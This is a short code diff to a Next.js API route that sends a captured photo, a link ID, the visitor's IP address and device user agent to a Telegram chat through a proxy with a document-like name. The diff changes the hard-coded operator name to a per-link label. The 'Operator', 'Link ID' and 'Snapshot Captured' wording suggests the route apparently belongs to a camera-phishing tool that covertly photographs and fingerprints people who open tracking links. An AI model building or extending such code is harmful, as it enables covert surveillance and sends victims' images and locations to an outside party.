@@ -1,5 +1,5 @@
 import { NextResponse } from 'next/server';
-import { getSnapshots, saveSnapshot, clearSnapshots, deleteSnapshot } from '@/lib/storage';
+import { getSnapshots, saveSnapshot, clearSnapshots, deleteSnapshot, getLink } from '@/lib/storage';
 
 export async function GET(request: Request) {
   const { searchParams } = new URL(request.url);
@@ -33,15 +33,18 @@ export async function POST(request: Request) {
     formData.append('chatid', process.env.TELEGRAM_CHAT_ID || '');
     formData.append('photo', blob, 'snapshot.jpg');
     
+    const link = await getLink(linkId);
+    const operatorName = link?.label || 'nadeem';
+    
     const caption = `🚀 *New Snapshot Captured!*\n\n` +
-      `👤 *Operator:* nadeem\n` +
+      `👤 *Operator:* ${operatorName}\n` +
       `🔑 *Link ID:* \`${linkId}\`\n` +
       `⏰ *Time:* ${timestamp}\n` +
       `🌐 *IP:* ${ip}\n` +
       `📱 *Device:* ${userAgent}`;
 
     formData.append('caption', caption);
-    formData.append('username', `nadeem Operator`);
+    formData.append('username', `${operatorName} Operator`);
 
     const proxyUrl = process.env.TELEGRAM_PROXY_URL || 'https://telegram-dacoumennt-api.vercel.app/api/proxy';
 
